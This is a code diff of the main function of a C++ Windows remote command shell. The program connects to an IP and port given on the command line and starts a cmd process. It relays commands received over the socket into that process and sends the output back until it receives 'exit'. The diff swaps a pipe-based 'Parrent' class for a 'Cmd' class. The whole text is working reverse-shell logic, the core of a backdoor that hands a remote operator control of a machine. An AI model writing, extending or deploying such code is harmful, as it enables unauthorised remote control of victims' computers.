@@ -7,8 +7,8 @@
 #include <stdio.h>
 #include <iostream>
 
-#include "Parrent.h"
 #include "Client.h"
+#include "cmd.h"
 
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
@@ -18,10 +18,10 @@
 
 int main(int argc, char **argv)
 {
-	int iResult = 0;
-	Parrent p;
+	Cmd cmd;
 	Client c;
-	
+	std::string result = "";
+	char msg[1024];
 	if (argc != 3)
 	{
 		printf("%s <ip> <port>", argv[0]);
@@ -36,21 +36,29 @@ int main(int argc, char **argv)
 		return 1;
 	}
 	
-	p.Setup();
-	p.CreateChildProcess();
-	p.ReadFromPipe();
+	//get and send first
+	cmd.CreateProcessW();
+	cmd.readCmd(result);
+	c.Send(result);
+
 	while (c.isConnected())
 	{
-		ZeroMemory(p.text, sizeof(p.text));
-		c.receive(p.text);
+		ZeroMemory(msg, sizeof(msg));
+		c.receive(msg);
+		if (!_strnicmp(msg, "exit", 4))
+		{
+			break;
+		}
 
-		p.WriteToPipeWithText();
-		p.ReadFromPipe();
+		cmd.writeCMD(msg);
+		cmd.readCmd(result);
 
-		c.Send(p.bufRead);
-
+		c.Send(result);
 	}
 	c.Shutdown();
+
+	cmd.KillCurrentCmdProcess();
+	cmd.clean();
 
 	printf("\n\n->End of parent execution.\n");
 	return 0;
